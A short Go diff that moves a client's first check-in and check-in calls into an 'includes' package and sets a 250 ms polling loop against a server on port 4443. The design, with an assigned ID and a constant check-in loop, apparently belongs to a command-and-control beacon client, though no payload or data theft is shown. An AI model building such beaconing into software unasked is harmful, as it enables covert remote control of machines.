@@ -1,7 +1,9 @@
 package main
 
 import (
+	"Deanscup/client/includes"
 	"fmt"
+	"time"
 )
 
 func main() {
@@ -9,14 +11,16 @@ func main() {
 	port := "4443"
 	url := fmt.Sprintf("https://%s:%s/", ip, port)
 
-	ID := FirstCheckin(ip, port)
+	ID := includes.FirstCheckin(ip, port)
 
 	fmt.Println("My Id is", ID)
 
 	fmt.Println("[+] Sending HTTP/3 request to:", url)
 
 	for {
-		checkIn(ip, port, ID)
-		// time.Sleep(2 * time.Second)
+		includes.CheckIn(ip, port, ID)
+
+		time.Sleep(250 * time.Millisecond)
 	}
+
 }
